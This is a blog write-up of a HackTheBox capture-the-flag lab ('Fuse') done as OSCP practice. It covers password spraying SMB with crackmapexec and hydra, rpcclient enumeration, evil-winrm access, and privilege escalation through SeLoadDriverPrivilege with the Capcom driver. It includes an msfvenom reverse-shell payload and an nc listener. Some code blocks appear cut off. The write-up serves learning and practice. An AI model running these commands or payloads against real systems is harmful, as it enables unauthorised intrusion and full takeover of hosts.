title: HackTheBox Fuse
---

Today's box on my OSCP journey is Fuse from HackTheBox.  My history on this box is interesting.  I got user months ago and was completely lost on the privesc.  I was desperate enough to look at a write up and knew I needed to develop a privesc methodolgy.  So here I am a couple of months later giving it another shot after some learning and improving my cheat sheet.

### Disclaimer

These isn't "here's how I got root after following someone else's writeup".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them, especially coming from a blue team background.  I like to write these to help explain how I thought through the box, where I needed help, and what I learned.

We have a Windows box on our hands for sure.  We'll definiotely probe SMB, HTTP, maybe brute force kerberos, and keep WinRM in mind if we get some creds.  Since I see 53 open, I add the IP to my etc/hosts.  We do this as you may actually get different pages using DNS instead of the IP.  By the way, how do I know what the domain is?  Check out the NMAP above.

> 10.10.10.193    fabricorp.local

I navigate to the site and it redirects to: http://fuse.fabricorp.local/papercut/logs/html/index.htm.
![fusehome](/images/fuse1.png)

Interesting.  So it's some sort of a print server and we can access some logs.  

![fusehome](/images/fuse2.png)
Oh look, usernames!  Let's make a list from the 3 pages:

```
pmerton
tlavel
sthompson
bhult
administrator

```

Ok cool, we've got users.  As always with HTTP though, let's make sure there aren't any other interesting directories.  (Note: As I've said before, take note that I'm not disguising the user agent and I have an absurd amount of threads.  This would be easy to spot for a defender, don't do this is a real world situiation!)

> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.193 -t 25


No Robots.txt... what else.

We've got some users and we've got SMB or kerberos to try some creds.  Let's use the tool with the best name to grab some words from the web page:

> cewl -d 5 -m 8 --with-numbers -w /root/Desktop/htb/fuse/fuse_words.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm

For clarity: d = page depth, m = minimum word length, --withnumbers picks up words with numbers (e.g. password1) -w writes the output to a file.  Why choose these?  The site doesn't appear very big, so setting the depth at 5 should cover me, I am completely guessing here but a general minimum standard password length is 8, and complexity is also a generally recommended setting for AD password configs.

We get a list of 45 words:

```

A few of these jump out as really good candidates, but let's use them all.

Before brute forcing passwords and users, I try SMB just to see if guest is enabled (smbclient -L 10.10.10.193).  It is not.  :(  We definitely need credentials.

## Hackin

Let me introduce to you a tool that I recently learned about: CrackMapExec (cme).  It's a versatile tool created by the famous byt3bl33d3r of BHIS and you should check out: [cme](https://github.com/byt3bl33d3r/CrackMapExec).  Let's run it and use SMB while feeding it a file of users and a file of those passwords:

> cme smb 10.10.10.193 -u /root/Desktop/htb/fuse/fuse_users -p /root/Desktop/htb/fuse/fuse_words.txt

Nothing... nothing... the anticipation of watching this thing is worse than staring at your microwave while your stomach growls at the hot pocket inside.  FIANLLY!

```
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
```

Huh?  Password must change?  That's weird.  None of the other combos worked though.  I used CME because it was a new tool I wanted to try.  The password thing throws me off so I try trusty old Hydra:

> hydra -L /root/Desktop/htb/fuse/fuse_users -P /root/Desktop/htb/fuse/fuse_words.txt 10.10.10.193 smb -V -f

The output is long (630 combinations), but here is what I want you to see:

```
ATTEMPT] target 10.10.10.193 - login "tlavel" - pass "Fabricorp01" - 63 of 630 [child 0] (0/0)
[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01

```

Notice that Hydra doesn't gather the addditional info and inform us that the password has expired.  Interesting!  CME seems to be the better tool for brute forcing SMB passwords.

Anyway, let's login with out new creds.  

```
smbclient -L 10.10.10.193 -U "tlavel"
Enter WORKGROUP\tlavel's password: 
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```

Ok, so even though CME found it first, we still would've discovered this... So how do I change the users password?   A little interwebs searching leads me to the smbpasswd utility:

```
smbpasswd -U tlavel -r fabricorp.local
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user tlavel on fabricorp.local.
```

I add that little nugget to my cheat sheet.  I'm feeling good and try to enumerate SMB again with the NEW password:

```
smbclient -L 10.10.10.193 -U "tlavel"
Enter WORKGROUP\tlavel's password: 
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```

What?  I just changed the password you stupid machine!  I figure maybe I ran the above smbpasswd wrong and try to change the password again, but this time I get a new error:

```machine fabricorp.local rejected the password change: Error was : When trying to update a password, this status indicates that some password update rule has been violated. For example, the password might not meet length criteria..
```

Oh come on!  So you remember that I JUST changed the password and now you're keeping it in your last X password history?!?!!?  The maker of this box is cruel.  So what probably happens is that he has some script or something resetting the user's password and setting it to change.  We have a couple of optios here: we can script something to change the password and then try the SMB enumeration, or we can just try to be faster.  If this scenario were in any way realistic (e.g. I could use that script again) I would put them time in, but this seems like something we can do with 2 windows.  Side bar: I liek Tilix, deal with it.

So I set up 2 termianl panes: one with smbpasswd and one with smbclient.  I quickly change the password (putting the ne wpassword in the clipboard for no chance of errors and to make it faster) and after 2 tries, it works!  

```
smbclient -L 10.10.10.193 -U "tlavel"
Enter WORKGROUP\tlavel's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin

	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.193 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

We've got some interesting shares, but trying to log in to each and searching for goodies is going to take time.  I switch to rpcclient so we can actually run commands and enumerate.  Yes, I have to start the above all over again since the password expired.

 ```
 rpcclient -U "tlavel" 10.10.10.193
Enter WORKGROUP\tlavel's password: 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]

user:[mberbatov] rid:[0x1db1]

 ```
 
 More users!  In addition to the ones we found from the print job logs, we found service accounts.  Rpcclient has a lot of great commands for enumeration, so let's keep going.  In my cheat sheet, I have enumdomusers, srvinfo, getdompwinfo, chgpasswd, queryuser, enumprinters.

 We're on a Winodws 10 box... password complexity IS turned on (glad we set cewl up the way we did), tlavel's password was already reset, and we've got a printer share.  Wait a minute, a password!  But for what account?  It's obviosuly for the printer... which account would install the printer?  How about the print service account!
 
 ```
 smbclient \\\\10.10.10.193\\HP-MFT01 -U "svc-print"
Enter WORKGROUP\svc-print's password: 

smb: \> pwd
Current directory is \\10.10.10.193\HP-MFT01\
```
 
 Now we've got something!  I close out of the gobuster directory search as we don't even need it, we've got a user.  Now, where can we go from here?  Let's go back to Nmap.  HTTP but I don't see a login to maybe upload a reverse shell, but we do have MSrpc.  I check my cheat sheet... EVIL WINRM MWAHAHAAHA!
 
```
evil-winrm -i 10.10.10.193 -u svc-print
*Evil-WinRM* PS C:\Users\svc-print\desktop> dir

```

## PrivEsc

Now that we've got a user, we need to finish this box.  We've got a stable shell, so let's figure this out.  Remember that this is where I got so lost last time that I gave up even after looking at a write up.  Enough time had passed to where I completely forgot the write up details, so this should be fun.

The biggest lesson the failure taught me last time is to have your methodology ready to go in your cheat sheet.  Mine is in Onenote and now the first page under Windows Priv esc contains some commands to run.  Like this one:

```
*Evil-WinRM* PS C:\Users\svc-print\desktop> whoami /all

Ok.  I see some things to check.  But let's use my cheat sheet and keep gathering some basics:

```*Evil-WinRM* PS C:\Users\svc-print\desktop> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
 ```
 
 Boooooo! You can't deny me!  Next is winPEAS.  I spin up a python web server and certutil that baby on over.  The output is long and takes some time to go through.  Here is the intersting bit:

```
   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeLoadDriverPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeShutdownPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
```
WinPEAS didn't give us anything crazy, but it does give us a link to cehck out these privs.  I scan the site, but it's not the direction I need right now.  I start searching "priv esc #privname" and SeLoadDriverPrivilege seems to be rather famously dangerous. This seems to be exactly what I was looking for: [Tarlogic](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/).  Since drivers help the kernel interact with hardware, they can be extremely dangerous.  The write up calls out Capcom.  Campcom?  Like Megaman Capcom?

That leads me to [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) and now I've got a plan.  You need to compile the C++ though.  The only compiler I've messed with (since college) is GCC (thank you Python for being incredibly user friendly).  I search "GCC C++" and it's lots of people having errors and complaining, but it does look like GCC can do it.  Trying to learn a better way, searching again tells me that I should be using M$ Visual Studio.

Well, there goes the next hour or so.  Visual Studio is huge and takes a while to download and install on my Windows host.  And of course, I can't even start a C__ project without installing more add ons.  FINALLY, I can open the C++ file and the project from Github.  I use VS Code for writing Python, but damn is VS powerful and complex!  After I poke around, I figure out wehat I need to do.  Compiling the loader was easy and straight forward.  But the exploit takes a little longer.  You should always at least try to figure out what someone else's exploit does.

This block is the bit we need to play with:

```
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

Launching a command prompt isn't going to help me since I'm in a webshell.  Do I transfer netcat over and have it send me a shell?  Since the exploit is just running an EXE, I decide the easiest thing to do is to just use msfvenom to create a reverse shell exe and have the exploit C++ run it.  I should have access to the temp directory.  If it doesn't work, I can try on the svc-print desktop.

```
static bool LaunchShell()
{

 I compiple the above, but get an error for the stdfax library.  I"ve run into this before in Python where a library is deprecated or included in another, so I decide to remove it.  Worst case scenario, I'll add it back and search the interwebs for help.  It complies!  Next I load 3 files (capcom.sys, the loader EXE, and the exploit exe) code to my VM.  Side bar: stop what you are doing and make a shared folder between your host and pen testing VM.  You'll thank me later.
 
 Now I have to create my reverse shell payload.  Nothing fancy here, standard reverse shell EXE:
 
 > msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.10 lport=53 -f exe > rev53.exe
 
 Now I transfer 4 files over to Fuse's c:\Windows\Temp: capcom.sys, the loader EXE, the Exploit EXE, and the reverse shell EXE.  Run the loader... ok, time to run the exploit EXE and see if this works!  Wait, set up a listener on 53:
 
 ```
 nc -nlvp 53
listening on [any] 53 ...
```

Cross your fingers and run the exploit!

VICTORY!  Wow, what a fun box!  I learned a lot for sure.  I add another page in my cheat sheet for Windows privsec outlining what I did above.  Other than not finishing that directory brute force, I am pretty happy with myself on this box.  I was much more confident this time on the privesc and sometimes a little of that will carry you through!
